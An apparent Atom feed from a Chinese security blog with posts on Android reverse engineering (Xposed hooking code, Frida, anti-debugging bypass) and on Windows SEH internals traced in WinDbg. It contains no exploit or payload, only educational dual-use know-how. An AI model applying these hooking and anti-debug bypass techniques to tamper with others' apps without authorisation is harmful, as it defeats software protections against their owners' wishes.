<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zzzZZZ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.qwerdf.com/"/>
  <updated>2019-02-22T08:26:58.786Z</updated>
  <id>http://blog.qwerdf.com/</id>
  
  <author>
    <name>xz</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android安全</title>
    <link href="http://blog.qwerdf.com/2019/02/22/android-xposed-frida/"/>
    <id>http://blog.qwerdf.com/2019/02/22/android-xposed-frida/</id>
    <published>2019-02-22T06:32:48.000Z</published>
    <updated>2019-02-22T08:26:58.786Z</updated>
    
    <content type="html"><![CDATA[<p>年前疯狂更了一波博客,是因为准备换工作了,说不定可以拿博客出去吹一吹.然而这么菜,根本没有勇气拿出来吹.本来是打算搞搞windows内核那些东西,结果感觉自己菜的一笔,没勇气干,还是面的Web.最终在年前,面上了某家的渗透测试(实质上是安服),工作后就莫名其妙偏了点移动方面的安全,于是就又捡起来以前的东西搞了搞.这一搞,不但发现了之前绕的弯路,也发现了一大堆有意思的东西:frida, llvm, etc…</p><h1 id="基础的前置工具"><a href="#基础的前置工具" class="headerlink" title="基础的前置工具"></a>基础的前置工具</h1><p>到现在依旧好用的apktools, signapk.jar, dex2jar, jd-gui, jeb, ida;以及最近发现的jadx, Luytan</p><h2 id="apktools"><a href="#apktools" class="headerlink" title="apktools"></a>apktools</h2><p>哪一部分出错了就删哪一部分, 再出错了再尝试修复.有时候甚至你用–no-res会出现问题,不使用却没问题.</p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><em>Shift + F11</em>直接导入头文件即可,<em>JNIEnv</em>和<em>JavaVM</em>给你自动识别还有啥不满足的,还要啥自行车.<br><em>Alt + G</em>修改ARM工作模式,这还是之前做pwnable.kr的题知道的.</p><h1 id="基础工具"><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h1><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><p>简单来说,Xposed仅仅用findAndHookMethod就可以搞定99%的应用场景.<br>Xposed最近读了一遍它的源码,过了一遍Xposed的流程.<br><a id="more"></a><br>Xposed的实现原理,既是在Android系统的Zygote进程启动之前,使用了de.robv.android.Xposed.XposedInit.hookResources()来注入自身框架.因此,由Zygote启动的所有app进程都会包含Xposed框架的相关文件.<br>Xposed在启动时调用了de.robv.android.Xposed.XposedInit.loadModules(),由此来加载所有启用的Xposed模块.此过程在有且仅有一次调用.<br>之后Xposed框架会在应用启动后,以启动app的相关信息作为参数,回调Xposed模块中Xposed_int文件定义的类的handleLoadPackage(final XC_LoadPackage.LoadPackageParam loadPackageParam)方法.Xposed模块根据传入的参数,来进行相关操作.</p><h3 id="Xposed免重启更改Xposed模块"><a href="#Xposed免重启更改Xposed模块" class="headerlink" title="Xposed免重启更改Xposed模块"></a>Xposed免重启更改Xposed模块</h3><p>因为Xposed只是在loadModules()的时候加载Xposed模块到内存中,此过程只进行一次.Xposed模块的怎么更新也不会影响到内存中的数据,除非通过反射,或修改bridage源码的方式再调用loadModules()重新载入Xposed模块.<br>因为Xposed模块的方法不可变,我们只需要在Xposed模块中手动<em>动态调用</em>其他可更新的方法即可.其中Class由PathClassLoader来通过File获取.</p><h3 id="Xposed-MutiDex-hook"><a href="#Xposed-MutiDex-hook" class="headerlink" title="Xposed MutiDex hook"></a>Xposed MutiDex hook</h3><p>在app有多dex的情况下,Xposed去hook某函数可能会出现ClassNotFound的异常.这是因为Xposed默认的classLoader只会获取到app主要dex下的方法.<br>我们只需要手动替换classLoader为Content.classLoader即可.而Content据开发者在<a href="https://github.com/rovo89/xposedbridge/issues/30#issuecomment-68488797" target="_blank" rel="noopener">某issue</a>中提示,对android.app.Application.Attach(Context)进行hook即可取到Content.<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">  XposedHelpers.findAndHookMethod(Application.class,<span class="string">"attach"</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">      <span class="keyword">if</span> (loadPackageParam.packageName.equal(<span class="string">'com.example.test'</span>))&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">protected</span> <span class="function"><span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">          Context context=(Context) param.args[<span class="number">0</span>];</span><br><span class="line">          lpparam.classLoader = context.getClassLoader();</span><br><span class="line">          XposedHelpers.findAndHookMethod(<span class="string">"con.example.test.test_class"</span>,lpparam.classLoader,<span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">              <span class="comment">//TODO :D</span></span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h1><p>跨平台的,爽的1b的.<br>javascript直接一把梭就是了,破js是弱类型的,绝对不会报错.<br>对于Android的java层,对于知道类型的直接Java.use和Java.cast就可以直接用Class的参数和成员变量.从一般函数到构造函数(因为<em>.$new() = .alloc() + .init()</em>)无所不能. <em>Java.choose</em>甚至可以让你实时监测<em>onMatch</em>和<em>onComplete</em>.<br>对于Android的so,你需要的一切都在<em>Module.findExportByName(“&lt;so_name&gt;.so”,”&lt;func_name&gt;”)</em>中.<em>Interceptor.attach()</em>的<em>onEnter</em>和<em>onLeave</em> 既是 <em>Java.choose</em> 的翻版.</p><p>简单改了下<a href="https://github.com/nccgroup/house/wiki/Overview" target="_blank" rel="noopener">house</a>, 在获取到的参数类型为Object的情况下, 通过getClass()和getDeclaredFields()来解析Object内容,并显示到log中.<br>让house的历史脚本兼容了下windows:将houseSock.py中的四个path的末尾加个<em>\</em>即可.</p><h1 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h1><p>虚拟机, 简单来说就是跨平台的VMProtect<br>虽然说知道原理,但是连windows下的VMP都不能手脱.真是菜的抠脚<br>LLVM和vmp一样,被我加入到了清单列表中.</p><h1 id="调试与反调试"><a href="#调试与反调试" class="headerlink" title="调试与反调试"></a>调试与反调试</h1><p>理论上可以通过修改android源码来bypass掉,但是又没钱买谷歌亲儿子,又不会做适配.<br>mprop真是神器,直接改ro判断,思路真是猥琐至极,是大佬.<br>反反调试只知道一些简单的常规的,姿势还是不够多.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;年前疯狂更了一波博客,是因为准备换工作了,说不定可以拿博客出去吹一吹.然而这么菜,根本没有勇气拿出来吹.本来是打算搞搞windows内核那些东西,结果感觉自己菜的一笔,没勇气干,还是面的Web.最终在年前,面上了某家的渗透测试(实质上是安服),工作后就莫名其妙偏了点移动方面的安全,于是就又捡起来以前的东西搞了搞.这一搞,不但发现了之前绕的弯路,也发现了一大堆有意思的东西:frida, llvm, etc…&lt;/p&gt;
&lt;h1 id=&quot;基础的前置工具&quot;&gt;&lt;a href=&quot;#基础的前置工具&quot; class=&quot;headerlink&quot; title=&quot;基础的前置工具&quot;&gt;&lt;/a&gt;基础的前置工具&lt;/h1&gt;&lt;p&gt;到现在依旧好用的apktools, signapk.jar, dex2jar, jd-gui, jeb, ida;以及最近发现的jadx, Luytan&lt;/p&gt;
&lt;h2 id=&quot;apktools&quot;&gt;&lt;a href=&quot;#apktools&quot; class=&quot;headerlink&quot; title=&quot;apktools&quot;&gt;&lt;/a&gt;apktools&lt;/h2&gt;&lt;p&gt;哪一部分出错了就删哪一部分, 再出错了再尝试修复.有时候甚至你用–no-res会出现问题,不使用却没问题.&lt;/p&gt;
&lt;h2 id=&quot;ida&quot;&gt;&lt;a href=&quot;#ida&quot; class=&quot;headerlink&quot; title=&quot;ida&quot;&gt;&lt;/a&gt;ida&lt;/h2&gt;&lt;p&gt;&lt;em&gt;Shift + F11&lt;/em&gt;直接导入头文件即可,&lt;em&gt;JNIEnv&lt;/em&gt;和&lt;em&gt;JavaVM&lt;/em&gt;给你自动识别还有啥不满足的,还要啥自行车.&lt;br&gt;&lt;em&gt;Alt + G&lt;/em&gt;修改ARM工作模式,这还是之前做pwnable.kr的题知道的.&lt;/p&gt;
&lt;h1 id=&quot;基础工具&quot;&gt;&lt;a href=&quot;#基础工具&quot; class=&quot;headerlink&quot; title=&quot;基础工具&quot;&gt;&lt;/a&gt;基础工具&lt;/h1&gt;&lt;h2 id=&quot;Xposed&quot;&gt;&lt;a href=&quot;#Xposed&quot; class=&quot;headerlink&quot; title=&quot;Xposed&quot;&gt;&lt;/a&gt;Xposed&lt;/h2&gt;&lt;p&gt;简单来说,Xposed仅仅用findAndHookMethod就可以搞定99%的应用场景.&lt;br&gt;Xposed最近读了一遍它的源码,过了一遍Xposed的流程.&lt;br&gt;
    
    </summary>
    
    
      <category term="android" scheme="http://blog.qwerdf.com/tags/android/"/>
    
      <category term="Xposed" scheme="http://blog.qwerdf.com/tags/Xposed/"/>
    
      <category term="frida" scheme="http://blog.qwerdf.com/tags/frida/"/>
    
      <category term="llvm" scheme="http://blog.qwerdf.com/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>SEH</title>
    <link href="http://blog.qwerdf.com/2019/01/16/StructuredExceptionHanding/"/>
    <id>http://blog.qwerdf.com/2019/01/16/StructuredExceptionHanding/</id>
    <published>2019-01-16T11:03:10.000Z</published>
    <updated>2019-01-18T20:00:52.915Z</updated>
    
    <content type="html"><![CDATA[<p>Structured Exception Handling,即SEH,是windows的异常处理机制.官方已不建议使用SEH,而是用ISO标准的c++异常处理.但是因为要向前兼容,所以在windows下SEH还是可以使用的,除了系统的代码大量使用以外,自己在一些特殊情况下,也是非常好用的.</p><p>也是一些基础啦.<br><a id="more"></a></p><h1 id="SEH结构"><a href="#SEH结构" class="headerlink" title="SEH结构"></a>SEH结构</h1><p>SEH其实说穿了就是几个结构体,然后window根据结构体的信息来进行相应处理.<br>即定义SEH的结构体<em>ntdll!_EXCEPTION_REGISTRATION_RECORD</em>,与SEH处理异常接受异常信息的结构体<em>VCRUNTIME140!_EXCEPTION_RECORD</em><br>大致既是:<br><em>_EXCEPTION_REGISTRATION_RECORD-&gt;handle-&gt;_except_handler4-&gt;_except_handler4_common()-&gt;_EXCEPTION_RECORD</em></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">//winseh.cpp</span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="symbol">    std:</span>:cout &lt;&lt; <span class="string">"Hello World!\n"</span><span class="comment">;</span></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        _asm &#123;</span><br><span class="line">            <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">            <span class="keyword">mov</span> [<span class="built_in">eax</span>], <span class="number">0</span></span><br><span class="line">        &#125;<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    __except(EXCEPTION_EXECUTE_HANDLER)&#123;</span><br><span class="line">        MessageBox(NULL, NULL, NULL, NULL)<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u winseh!main l40</span><br><span class="line">winseh!main [c:\users\root\source\repos\winseh\winseh\winseh.cpp @ <span class="number">9</span>]:</span><br><span class="line">010f1000 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line">010f1001 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">010f1003 6afe            <span class="keyword">push</span>    <span class="number">0FFFFFFFEh</span></span><br><span class="line">010f1005 6838250f01      <span class="keyword">push</span>    offset winseh!__rtc_tzz+<span class="number">0x4</span> (010f2538)</span><br><span class="line">010f100a 6885130f01      <span class="keyword">push</span>    offset winseh!_except_handler4 (010f1385)--+//seh-&gt;Handler</span><br><span class="line">010f100f 64a100000000    <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">00000000h</span>]---------------+//seh-&gt;Next</span><br><span class="line">010f1015 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                           &lt;--<span class="keyword">push</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</span><br><span class="line">010f1016 83ec08          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">8</span></span><br><span class="line">010f1019 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line">010f101a <span class="number">56</span>              <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line">010f101b <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line">010f101c a104300f01      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [winseh!__security_cookie (010f3004)]</span><br><span class="line">010f1021 3145f8          <span class="keyword">xor</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">eax</span></span><br><span class="line">010f1024 33c5            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">010f1026 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">010f1027 8d45f0          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]                &lt;--<span class="number">0x010f1015</span></span><br><span class="line">010f102a 64a300000000    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">00000000h</span>],<span class="built_in">eax</span> &lt;--SEH链最后的结构地址</span><br><span class="line">010f1030 8965e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esp</span></span><br><span class="line">010f1033 8b0d34200f01    <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [winseh!_imp_?coutstd (010f2034)]</span><br><span class="line">010f1039 e852000000      <span class="keyword">call</span>    winseh!<span class="keyword">std</span>::operator&lt;&lt;&lt;<span class="keyword">std</span>::char_traits&lt;char&gt; &gt; (010f1090)</span><br><span class="line">010f103e c745fc00000000  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">0</span></span><br><span class="line">010f1045 b800000000      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="number">0</span> &lt;----</span><br><span class="line">010f104a c60000          <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>],<span class="number">0</span>  </span><br><span class="line">010f104d eb17            <span class="keyword">jmp</span>     winseh!main+<span class="number">0x66</span> (010f1066)</span><br><span class="line">010f104f b801000000      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">bp</span> 010f1045</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r</span><br><span class="line">----------</span><br><span class="line">//seh链 此处为<span class="built_in">fs</span>:[<span class="number">0</span>]-&gt;<span class="number">0x00b5fba0</span>-&gt;<span class="number">0x00b5fc0c</span>-&gt;<span class="number">0x00b5fc24</span>-&gt;<span class="number">0xffffffff</span></span><br><span class="line">//所对应的处理函数为: <span class="number">0x010f1385</span>-&gt;<span class="number">0x010f1385</span>-&gt;<span class="number">0x77a186d0</span>-&gt;<span class="number">0x77a25196</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !exchain </span><br><span class="line">00b5fb58: winseh!_except_handler4+<span class="number">0</span> (010f1385) </span><br><span class="line">  CRT scope  <span class="number">0</span>, filter: winseh!main+4f (010f104f)</span><br><span class="line"><span class="symbol">                func:</span>   winseh!main+<span class="number">55</span> (010f1055)</span><br><span class="line">00b5fba0: winseh!_except_handler4+<span class="number">0</span> (010f1385)</span><br><span class="line">  CRT scope  <span class="number">0</span>, filter: winseh!__scrt_common_main_seh+<span class="number">127</span> (010f15a5)</span><br><span class="line"><span class="symbol">                func:</span>   winseh!__scrt_common_main_seh+13b (010f15b9)</span><br><span class="line">00b5fc0c: ntdll!_except_handler4+<span class="number">0</span> (77a186d0)</span><br><span class="line">  CRT scope  <span class="number">0</span>, filter: ntdll!__RtlUserThreadStart+3c97b (77a42f79)</span><br><span class="line"><span class="symbol">                func:</span>   ntdll!__RtlUserThreadStart+3ca17 (77a43015)</span><br><span class="line">00b5fc24: ntdll!FinalExceptionHandlerPad22+<span class="number">0</span> (77a25196)</span><br><span class="line">Invalid exception stack <span class="meta">at</span> ffffffff</span><br><span class="line">------------</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD //下一个SEH结构地址</span><br><span class="line">   +<span class="number">0x004</span> Handler          : Ptr32     _EXCEPTION_DISPOSITION  //异常处理函数</span><br><span class="line">------------</span><br><span class="line">//手动验证一波</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dg <span class="built_in">fs</span></span><br><span class="line">                                  P <span class="built_in">Si</span> Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an <span class="built_in">es</span> ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0053</span> <span class="number">00916000</span> 00000fff Data RW Ac <span class="number">3</span> Bg By P  Nl 000004f3</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> ntdll!_EXCEPTION_REGISTRATION_RECORD -l next poi(<span class="built_in">fs</span>:[<span class="number">0</span>])</span><br><span class="line">next <span class="meta">at</span> <span class="number">0x00b5fb58</span>          //<span class="built_in">fs</span>:[<span class="number">0</span>]指向seh头</span><br><span class="line">---------------------------------------------</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0x00b5fba0</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x010f1385</span>     _EXCEPTION_DISPOSITION  winseh!_except_handler4+<span class="number">0</span></span><br><span class="line"></span><br><span class="line">next <span class="meta">at</span> <span class="number">0x00b5fba0</span></span><br><span class="line">---------------------------------------------</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0x00b5fc0c</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x010f1385</span>     _EXCEPTION_DISPOSITION  winseh!_except_handler4+<span class="number">0</span></span><br><span class="line"></span><br><span class="line">next <span class="meta">at</span> <span class="number">0x00b5fc0c</span></span><br><span class="line">---------------------------------------------</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0x00b5fc24</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x77a186d0</span>     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+<span class="number">0</span></span><br><span class="line"></span><br><span class="line">next <span class="meta">at</span> <span class="number">0x00b5fc24</span></span><br><span class="line">---------------------------------------------</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xffffffff</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x77a25196</span>     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad22+<span class="number">0</span></span><br><span class="line">----</span><br></pre></td></tr></table></figure><h1 id="SEH异常处理函数"><a href="#SEH异常处理函数" class="headerlink" title="SEH异常处理函数"></a>SEH异常处理函数</h1><p>相关处理函数<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u 77a25196 //SEH最终处理</span><br><span class="line">ntdll!FinalExceptionHandlerPad22:</span><br><span class="line">77a25196 <span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line">ntdll!FinalExceptionHandlerPad23:</span><br><span class="line">77a25197 <span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line">ntdll!FinalExceptionHandlerPad24:</span><br><span class="line">77a25198 <span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line">...more</span><br><span class="line">77a251c0 e9f2b80500      <span class="keyword">jmp</span>     ntdll!_FinalExceptionHandler (77a80ab7)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u 010f1385</span><br><span class="line">winseh!_except_handler4 [d:\agent\_work\<span class="number">3</span>\s\src\vctools\crt\vcstartup\src\<span class="number">eh</span>\i386\chandler4gs.c @ <span class="number">84</span>]:</span><br><span class="line">010f1385 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line">010f1386 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">010f1388 ff7514          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">14h</span>]</span><br><span class="line">010f138b ff7510          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>]</span><br><span class="line">010f138e ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</span><br><span class="line">010f1391 ff7508          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">010f1394 68a8130f01      <span class="keyword">push</span>    offset winseh!__security_check_cookie (010f13a8)</span><br><span class="line">010f1399 6804300f01      <span class="keyword">push</span>    offset winseh!__security_cookie (010f3004)</span><br><span class="line">010f139e e8370b0000      <span class="keyword">call</span>    winseh!except_handler4_common (010f1eda) &lt;----</span><br><span class="line">010f13a3 83c418          <span class="keyword">add</span>     <span class="built_in">esp</span>,<span class="number">18h</span></span><br><span class="line">010f13a6 <span class="number">5d</span>              <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line">010f13a7 c3              <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; x vcruntime140!_except_handler4_common</span><br><span class="line">74fe4480          VCRUNTIME140!_except_handler4_common (</span><br><span class="line">                              unsigned <span class="keyword">int</span> *, //<span class="number">0x0</span> __security_cookie</span><br><span class="line">                              &lt;function&gt; *, //<span class="number">0x4</span> __security_check_cookie</span><br><span class="line">                              struct _EXCEPTION_RECORD *, //<span class="number">0x8</span>  &lt;----</span><br><span class="line">                              struct _EXCEPTION_REGISTRATION_RECORD *, //<span class="number">0xc</span></span><br><span class="line">                              struct _CONTEXT *,//<span class="number">0x10</span></span><br><span class="line">                              void *//<span class="number">0x14</span> (DispatcherContent)</span><br><span class="line">                          )</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD</span><br><span class="line">winseh!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : Uint4B //Exception Code 错误代码</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : Uint4B //EstablisherFlags </span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : Ptr32 _EXCEPTION_RECORD //*ExceptionRecord</span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : Ptr32 Void //ExceptionAddress 出错地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : Uint4B //# os Parameters</span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] Uint4B</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Structured Exception Handling,即SEH,是windows的异常处理机制.官方已不建议使用SEH,而是用ISO标准的c++异常处理.但是因为要向前兼容,所以在windows下SEH还是可以使用的,除了系统的代码大量使用以外,自己在一些特殊情况下,也是非常好用的.&lt;/p&gt;
&lt;p&gt;也是一些基础啦.&lt;br&gt;
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="shellcode" scheme="http://blog.qwerdf.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>获取DLL的函数地址</title>
    <link href="http://blog.qwerdf.com/2019/01/08/GetFunctionAddr/"/>
    <id>http://blog.qwerdf.com/2019/01/08/GetFunctionAddr/</id>
    <published>2019-01-08T15:22:56.000Z</published>
    <updated>2019-01-19T08:36:01.299Z</updated>
    
